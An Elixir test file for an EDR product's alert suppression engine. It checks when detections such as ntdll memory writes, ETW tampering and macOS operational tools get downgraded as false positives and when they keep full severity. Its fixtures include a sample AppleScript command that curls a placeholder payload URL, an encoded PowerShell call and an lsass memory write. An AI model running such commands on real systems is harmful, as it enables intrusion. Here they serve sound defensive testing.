defmodule TamanduaServer.Alerts.SuppressionTest do
  @moduledoc """
  Tests for the Alert Suppression Engine GenServer.

  Covers:
  - Contextual auto-suppression (repeated identical alerts)
  - Rule-based suppression matching (title, severity, agent_id patterns)
  - Suppression statistics tracking
  - Configuration defaults
  - GenServer lifecycle (start, stats, refresh)
  """

  use TamanduaServer.DataCase, async: false

  alias TamanduaServer.Alerts
  alias TamanduaServer.Alerts.Suppression

  import TamanduaServer.AccountsFixtures
  import TamanduaServer.AlertsFixtures

  # ============================================================================
  # Configuration
  # ============================================================================

  describe "get_config/0" do
    test "returns occurrence threshold and reset period" do
      config = Suppression.get_config()

      assert is_map(config)
      assert Map.has_key?(config, :occurrence_threshold)
      assert Map.has_key?(config, :reset_period_seconds)
      assert is_integer(config.occurrence_threshold)
      assert is_integer(config.reset_period_seconds)
    end

    test "default threshold is 5" do
      config = Suppression.get_config()
      assert config.occurrence_threshold == 5
    end

    test "default reset period is 24 hours (86400 seconds)" do
      config = Suppression.get_config()
      assert config.reset_period_seconds == 86_400
    end
  end

  # ============================================================================
  # check_suppression/2
  # ============================================================================

  describe "check_suppression/2" do
    test "allows a new alert that has no suppression rule" do
      alert_data = %{
        title: "Unique alert #{System.unique_integer([:positive])}",
        severity: "high",
        agent_id: Ecto.UUID.generate(),
        detection_metadata: %{},
        evidence: %{}
      }

      result = Suppression.check_suppression(alert_data, Ecto.UUID.generate())
      assert result == :allow
    end

    test "allows alerts when no matching rules exist" do
      alert_data = %{
        title: "Never-seen-before alert title #{System.unique_integer([:positive])}",
        severity: "medium",
        detection_metadata: %{"rule_name" => "unique_rule_#{System.unique_integer([:positive])}"},
        evidence: %{}
      }

      assert Suppression.check_suppression(alert_data, nil) == :allow
    end
  end

  describe "Alerts.create_alert/1 integration" do
    test "applies explicit false-positive suppression before inserting new alerts" do
      organization = organization_fixture()
      agent_id = Ecto.UUID.generate()
      title = "Known noisy developer tool #{System.unique_integer([:positive])}"

      source_alert =
        alert_fixture(
          organization_id: organization.id,
          agent_id: agent_id,
          title: title,
          severity: "low"
        )

      assert {:ok, _rule} =
               Suppression.create_rule_from_alert(source_alert,
                 action: "suppress",
                 name: "Suppress #{title}"
               )

      Suppression.refresh_cache()
      Process.sleep(50)

      assert {:error, {:suppressed, reason}} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: agent_id,
                 title: title,
                 description: "Should be suppressed before persistence",
                 severity: "low",
                 status: "new"
               })

      assert reason =~ "Suppressed by rule"
    end

    test "does not suppress or downgrade obvious false positives from text-only matches" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "brave.exe performing writeprocessmemory on brave.exe",
                 severity: "high",
                 status: "new"
               })

      assert alert.severity == "high"
      refute alert.severity_adjusted
    end

    test "downgrades self-write noise only when structured fields prove the context" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Potential NTDLL write",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   process: %{name: "brave.exe", pid: 4242}
                 },
                 raw_event: %{
                   source_pid: 4242,
                   target_pid: 4242,
                   target_process: "brave.exe",
                   mem_type_str: "MEM_IMAGE",
                   old_protection_str: "PAGE_EXECUTE_READ",
                   new_protection_str: "PAGE_EXECUTE_READ",
                   target_function: "ntdll.dll!.text",
                   thread_from_unbacked: false,
                   thread_start_address: nil
                 }
               })

      assert alert.severity == "medium"
      assert alert.original_severity == "high"
      assert alert.severity_adjusted
      assert alert.detection_metadata["fp_basis"] == "structured_fields"
      assert alert.detection_metadata["fp_reason"] ==
               "ntdll_self_write_no_permission_transition_structured"
    end

    test "does not downgrade ntdll self-write when the memory protection becomes RWX" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Potential NTDLL write",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "brave.exe", pid: 4242}
                 },
                 raw_event: %{
                   source_pid: 4242,
                   target_pid: 4242,
                   target_process: "brave.exe",
                   mem_type_str: "MEM_IMAGE",
                   old_protection_str: "PAGE_READWRITE",
                   new_protection_str: "PAGE_EXECUTE_READWRITE",
                   target_function: "ntdll.dll!.text"
                 }
               })

      assert alert.severity == "high"
      refute alert.severity_adjusted
    end

    test "downgrades ntdll write detections without target context to medium" do
      organization = organization_fixture()

      for rule <- [
            "ntdll_write_writeprocessmemory",
            "ntdll_write_ntwritevirtualmemory",
            "ntdll_write_ntmapviewofsection"
          ] do
        assert {:ok, alert} =
                 Alerts.create_alert(%{
                   organization_id: organization.id,
                   agent_id: Ecto.UUID.generate(),
                   title: "Agent detection: #{rule}",
                   description: "Potential NTDLL write without target context",
                   severity: "critical",
                   status: "new",
                   evidence: %{
                     detection: %{rule_name: rule},
                     process: %{name: "chrome.exe", pid: 9911}
                   },
                   raw_event: %{}
                 })

        assert alert.severity == "medium"
        assert alert.original_severity == "critical"
        assert alert.severity_adjusted
        assert alert.detection_metadata["fp_reason"] == "ntdll_write_missing_target_context"
      end
    end

    test "does not downgrade ntdll write detections when target context is present" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Potential credential target memory write",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "unknown.exe", pid: 777}
                 },
                 raw_event: %{
                   source_pid: 777,
                   target_pid: 500,
                   target_process: "lsass.exe",
                   write_size: 4096
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "downgrades a signed cross-process ntdll write into .text to medium" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Signed debugger writing into ntdll .text of another process",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "windbg.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "windbg.exe",
                   source_is_signed: true,
                   target_pid: 2000,
                   target_process: "notepad.exe",
                   target_function: "ntdll.dll!.text",
                   region_class: "text",
                   old_protection_str: "PAGE_EXECUTE_READ",
                   new_protection_str: "PAGE_EXECUTE_READ"
                 }
               })

      assert alert.severity == "medium"
      assert alert.original_severity == "critical"
      assert alert.severity_adjusted

      assert alert.detection_metadata["fp_reason"] ==
               "cross_process_ntdll_write_legitimate_signed_source"
    end

    test "downgrades an allowlisted-path cross-process ntdll write without a signature verdict" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Debugger-kit tool writing into ntdll .text (no signature verdict)",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "mytool.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "mytool.exe",
                   source_path: "C:\\Program Files\\Windows Kits\\10\\Debuggers\\x64\\mytool.exe",
                   target_pid: 2000,
                   target_process: "notepad.exe",
                   target_function: "ntdll.dll!.text",
                   region_class: "text"
                 }
               })

      assert alert.severity == "medium"
      assert alert.severity_adjusted

      assert alert.detection_metadata["fp_reason"] ==
               "cross_process_ntdll_write_legitimate_known_tool"
    end

    test "keeps a cross-process ntdll write at full severity when the region becomes RWX" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Unsigned process writing an RWX region into another process",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "evil.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "evil.exe",
                   source_is_signed: false,
                   target_pid: 2000,
                   target_process: "notepad.exe",
                   target_function: "ntdll.dll!.text",
                   region_class: "rwx",
                   old_protection_str: "PAGE_EXECUTE_READ",
                   new_protection_str: "PAGE_EXECUTE_READWRITE"
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "keeps a signed cross-process ntdll write at full severity when the target is a credential store" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Signed source but the target is lsass — never downgrade",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "windbg.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "windbg.exe",
                   source_is_signed: true,
                   target_pid: 500,
                   target_process: "lsass.exe",
                   target_function: "ntdll.dll!.text",
                   region_class: "text"
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "keeps a cross-process ntdll write at full severity for an unsigned unknown source" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Unsigned, non-allowlisted source writing into another process",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "updater_svc.exe", pid: 6644}
                 },
                 raw_event: %{
                   source_pid: 6644,
                   source_process: "updater_svc.exe",
                   source_path: "C:\\Users\\victim\\AppData\\Local\\Temp\\updater_svc.exe",
                   source_is_signed: false,
                   target_pid: 8888,
                   target_process: "explorer.exe",
                   target_function: "ntdll.dll!.text",
                   region_class: "text"
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "keeps a signed cross-process ntdll write at full severity when it targets the export table" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Signed source but the write lands in the ntdll export table — never downgrade",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "windbg.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "windbg.exe",
                   source_is_signed: true,
                   target_pid: 2000,
                   target_process: "explorer.exe",
                   target_function: "ntdll.dll!export_table",
                   region_class: "export_table"
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "keeps a signed cross-process ntdll write at full severity when an unbacked thread executes" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Signed source into .text but a thread starts from unbacked memory — never downgrade",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "windbg.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "windbg.exe",
                   source_is_signed: true,
                   target_pid: 2000,
                   target_process: "explorer.exe",
                   target_function: "ntdll.dll!.text",
                   region_class: "text",
                   thread_from_unbacked: true,
                   thread_start_address: "0x7ff9c2340000"
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "keeps a signed cross-process ntdll write at full severity when protection flags show RWX without a region class" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: ntdll_write_writeprocessmemory",
                 description: "Signed source but the resulting protection is RWX (region_class absent) — never downgrade",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "ntdll_write_writeprocessmemory"},
                   process: %{name: "windbg.exe", pid: 1000}
                 },
                 raw_event: %{
                   source_pid: 1000,
                   source_process: "windbg.exe",
                   source_is_signed: true,
                   target_pid: 2000,
                   target_process: "explorer.exe",
                   new_protection_str: "PAGE_EXECUTE_READWRITE"
                 }
               })

      assert alert.severity == "critical"
      refute alert.severity_adjusted
    end

    test "downgrades only known benign EdgeUpdate ETW updater shapes" do
      organization = organization_fixture()

      base = %{
        organization_id: organization.id,
        agent_id: Ecto.UUID.generate(),
        title: "Agent detection: etw_12345678",
        description: "ETW tamper-like event",
        severity: "critical",
        status: "new",
        evidence: %{
          detection: %{rule_name: "etw_12345678", mitre_technique: "T1562.006"},
          process: %{
            name: "MicrosoftEdgeUpdate.exe",
            parent_name: "svchost.exe",
            path: "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"
          }
        }
      }

      assert {:ok, alert_c} =
               Alerts.create_alert(
                 put_in(base, [:evidence, :process, :command_line], "MicrosoftEdgeUpdate.exe /c")
               )

      assert alert_c.severity == "medium"
      assert alert_c.detection_metadata["fp_reason"] == "edge_update_etw_patch_without_actionable_context"

      assert {:ok, alert_scheduler} =
               Alerts.create_alert(
                 base
                 |> Map.put(:agent_id, Ecto.UUID.generate())
                 |> put_in(
                   [:evidence, :process, :command_line],
                   "MicrosoftEdgeUpdate.exe /ua /installsource scheduler"
                 )
               )

      assert alert_scheduler.severity == "medium"

      assert {:ok, alert_core_without_parent} =
               Alerts.create_alert(
                 base
                 |> Map.put(:agent_id, Ecto.UUID.generate())
                 |> update_in([:evidence, :process], &Map.delete(&1, :parent_name))
                 |> put_in(
                   [:evidence, :process, :command_line],
                   "\"D:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource core"
                 )
                 |> put_in(
                   [:evidence, :process, :path],
                   "D:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"
                 )
               )

      assert alert_core_without_parent.severity == "medium"

      assert {:ok, suspicious} =
               Alerts.create_alert(
                 base
                 |> Map.put(:agent_id, Ecto.UUID.generate())
                 |> put_in(
                   [:evidence, :process, :command_line],
                   "MicrosoftEdgeUpdate.exe --unexpected-disable-etw"
                 )
               )

      assert suspicious.severity == "critical"
      refute suspicious.severity_adjusted
    end

    test "downgrades only structured Windows core service process false positives" do
      organization = organization_fixture()

      assert {:ok, services_alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Masquerading: wininit.exe -> services.exe (PID 904) [T1036]",
                 description: "Core Windows process chain",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "System File Execution Location Anomaly"},
                   process: %{
                     name: "services.exe",
                     parent_name: "wininit.exe",
                     path: "D:\\Windows\\System32\\services.exe",
                     parent_path: "D:\\Windows\\System32\\wininit.exe",
                     cmdline: "D:\\WINDOWS\\system32\\services.exe"
                   }
                 }
               })

      assert services_alert.severity == "info"
      assert services_alert.detection_metadata["fp_reason"] ==
               "windows_core_service_process_chain_structured"

      assert {:ok, svchost_alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "WMI Execution: services.exe -> svchost.exe (PID 8) [T1047]",
                 description: "Core Windows service host chain",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "HackTool - CrackMapExec Execution"},
                   process: %{
                     name: "svchost.exe",
                     parent_name: "services.exe",
                     path: "D:\\Windows\\System32\\svchost.exe",
                     parent_path: "D:\\Windows\\System32\\services.exe",
                     cmdline: "D:\\WINDOWS\\system32\\svchost.exe -k InvSvcGroup -p -s InventorySvc"
                   }
                 }
               })

      assert svchost_alert.severity == "info"

      assert {:ok, suspicious} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Masquerading: services.exe -> svchost.exe (PID 1234) [T1036]",
                 description: "Lookalike outside System32 should stay high",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "System File Execution Location Anomaly"},
                   process: %{
                     name: "svchost.exe",
                     parent_name: "services.exe",
                     path: "C:\\Users\\Public\\svchost.exe",
                     parent_path: "D:\\Windows\\System32\\services.exe",
                     cmdline: "C:\\Users\\Public\\svchost.exe"
                   }
                 }
               })

      assert suspicious.severity == "high"
      refute suspicious.severity_adjusted
    end

    test "downgrades ETW tamper detections only when actionable context is missing" do
      organization = organization_fixture()

      assert {:ok, contextless} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: etw_aabbccdd",
                 description: "ETW tamper-like event without process context",
                 severity: "critical",
                 status: "new",
                 evidence: %{detection: %{rule_name: "etw_aabbccdd", mitre_technique: "T1562.006"}},
                 raw_event: %{}
               })

      assert contextless.severity == "medium"
      assert contextless.detection_metadata["fp_reason"] == "etw_tamper_missing_actionable_context"

      assert {:ok, contextual} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: etw_aabbccdd",
                 description: "ETW tamper-like event with target session",
                 severity: "critical",
                 status: "new",
                 evidence: %{detection: %{rule_name: "etw_aabbccdd", mitre_technique: "T1562.006"}},
                 raw_event: %{process_name: "powershell.exe", target_session: "EventLog-Application"}
               })

      assert contextual.severity == "critical"
      refute contextual.severity_adjusted
    end

    test "downgrades score-only operational tool high risk alerts without suppressing specific detections" do
      organization = organization_fixture()

      assert {:ok, alert} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: behavioral_high_risk_score",
                 description: "Score-only behavioral rollup from local validation shell",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "behavioral_high_risk_score"},
                   process: %{
                     name: "dotnet.exe",
                     path: "C:\\Program Files\\dotnet\\dotnet.exe",
                     parent_name: "pwsh.exe",
                     parent_path: "C:\\Users\\victt\\.dotnet\\tools\\pwsh.exe",
                     cmdline:
                       "dotnet C:\\Users\\victt\\.dotnet\\tools\\.store\\powershell\\tools\\pwsh.dll -Command Get-ChildItem tools\\detection_validation\\profiles"
                   }
                 }
               })

      assert alert.severity == "medium"
      assert alert.original_severity == "critical"
      assert alert.severity_adjusted
      assert alert.detection_metadata["fp_reason"] == "behavioral_score_only_operational_tool_context"

      assert {:ok, specific} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: behavioral_encoded_powershell",
                 description: "Specific encoded PowerShell detection must remain actionable",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "behavioral_encoded_powershell"},
                   process: %{
                     name: "pwsh.exe",
                     path: "C:\\Users\\victt\\.dotnet\\tools\\pwsh.exe",
                     parent_name: "codex.exe",
                     cmdline: "pwsh.exe -EncodedCommand AAAA"
                   }
                 }
               })

      assert specific.severity == "critical"
      refute specific.severity_adjusted
    end

    test "downgrades narrow macOS operational false positives without suppressing specific AppleScript detections" do
      organization = organization_fixture()

      assert {:ok, osascript_admin} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: behavioral_high_risk_score",
                 description: "Score-only rollup from GUI LaunchDaemon repair",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "behavioral_high_risk_score"},
                   process: %{
                     name: "osascript",
                     path: "/usr/bin/osascript",
                     parent_name: "Tamandua EDR",
                     parent_path: "/Applications/Tamandua EDR.app/Contents/MacOS/tamandua-edr",
                     command_line:
                       "osascript -e 'do shell script \"launchctl kickstart -k system/com.tamandua.tamanduaagent\" with administrator privileges'"
                   }
                 }
               })

      assert osascript_admin.severity == "medium"
      assert osascript_admin.original_severity == "critical"
      assert osascript_admin.severity_adjusted

      assert osascript_admin.detection_metadata["fp_reason"] ==
               "macos_behavioral_score_only_operational_tool_context"

      assert {:ok, launchctl_repair} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: behavioral_high_risk_score",
                 description: "Score-only rollup from launchd repair",
                 severity: "high",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "behavioral_high_risk_score"},
                   process: %{
                     name: "launchctl",
                     path: "/bin/launchctl",
                     parent_name: "tamandua-agent",
                     parent_path: "/opt/tamandua/tamandua-agent",
                     command_line: "launchctl bootstrap system /Library/LaunchDaemons/com.tamandua.tamanduaagent.plist"
                   }
                 }
               })

      assert launchctl_repair.severity == "medium"
      assert launchctl_repair.severity_adjusted

      assert {:ok, specific_applescript} =
               Alerts.create_alert(%{
                 organization_id: organization.id,
                 agent_id: Ecto.UUID.generate(),
                 title: "Agent detection: behavioral_applescript_execution",
                 description: "Specific AppleScript detection must remain actionable",
                 severity: "critical",
                 status: "new",
                 evidence: %{
                   detection: %{rule_name: "behavioral_applescript_execution"},
                   process: %{
                     name: "osascript",
                     path: "/usr/bin/osascript",
                     parent_name: "zsh",
                     command_line: "osascript -e 'do shell script \"curl https://example.invalid/payload\"'"
                   }
                 }
               })

      assert specific_applescript.severity == "critical"
      refute specific_applescript.severity_adjusted
    end
  end

  # ============================================================================
  # record_occurrence/2
  # ============================================================================

  describe "record_occurrence/2" do
    test "returns :ok without blocking" do
      alert_data = %{
        title: "Repeated alert",
        severity: "low",
        detection_metadata: %{"rule_name" => "test_rule"},
        evidence: %{"process" => %{"name" => "test.exe"}}
      }

      # record_occurrence is a cast, so it returns :ok immediately
      assert Suppression.record_occurrence(alert_data, "agent-1") == :ok
    end
  end

  # ============================================================================
  # get_stats/0
  # ============================================================================

  describe "get_stats/0" do
    test "returns a map with expected keys" do
      stats = Suppression.get_stats()

      assert is_map(stats)
      assert Map.has_key?(stats, :total_checked)
      assert Map.has_key?(stats, :total_suppressed)
      assert Map.has_key?(stats, :suppression_rate)
      assert Map.has_key?(stats, :active_rules)
      assert Map.has_key?(stats, :context_entries)
      assert Map.has_key?(stats, :occurrence_threshold)
      assert Map.has_key?(stats, :reset_period_seconds)
    end

    test "total_checked and total_suppressed are non-negative integers" do
      stats = Suppression.get_stats()

      assert is_integer(stats.total_checked) and stats.total_checked >= 0
      assert is_integer(stats.total_suppressed) and stats.total_suppressed >= 0
    end

    test "suppression_rate is a float between 0.0 and 100.0" do
      stats = Suppression.get_stats()

      assert is_float(stats.suppression_rate)
      assert stats.suppression_rate >= 0.0
      assert stats.suppression_rate <= 100.0
    end

    test "active_rules is a non-negative integer" do
      stats = Suppression.get_stats()
      assert is_integer(stats.active_rules) and stats.active_rules >= 0
    end
  end

  # ============================================================================
  # get_active_rules/1
  # ============================================================================

  describe "get_active_rules/1" do
    test "returns a list (possibly empty)" do
      rules = Suppression.get_active_rules()
      assert is_list(rules)
    end

    test "accepts nil agent_id for global rules" do
      rules = Suppression.get_active_rules(nil)
      assert is_list(rules)
    end

    test "accepts a specific agent_id" do
      rules = Suppression.get_active_rules(Ecto.UUID.generate())
      assert is_list(rules)
    end
  end

  # ============================================================================
  # refresh_cache/0
  # ============================================================================

  describe "refresh_cache/0" do
    test "returns :ok" do
      assert Suppression.refresh_cache() == :ok
    end

    test "is idempotent" do
      assert Suppression.refresh_cache() == :ok
      assert Suppression.refresh_cache() == :ok
    end
  end

  # ============================================================================
  # Contextual auto-suppression behavior
  # ============================================================================

  describe "contextual auto-suppression" do
    test "identical alerts below threshold are allowed" do
      agent_id = Ecto.UUID.generate()

      alert_data = %{
        title: "Repeated context alert #{System.unique_integer([:positive])}",
        severity: "medium",
        detection_metadata: %{"rule_name" => "ctx_test_rule"},
        evidence: %{"process" => %{"name" => "ctx_test.exe"}}
      }

      # Record a few occurrences (below threshold of 5)
      for _ <- 1..3 do
        Suppression.record_occurrence(alert_data, agent_id)
      end

      # Allow a brief delay for casts to be processed
      Process.sleep(50)

      # Should still allow since we are below threshold
      result = Suppression.check_suppression(alert_data, agent_id)
      assert result == :allow
    end
  end

  # ============================================================================
  # ETS table existence
  # ============================================================================

  describe "ETS tables" do
    test "context table exists after GenServer starts" do
      info = :ets.info(:alert_suppression_context, :size)
      assert info != :undefined
    end

    test "rules cache table exists after GenServer starts" do
      info = :ets.info(:alert_suppression_rules_cache, :size)
      assert info != :undefined
    end
  end
end
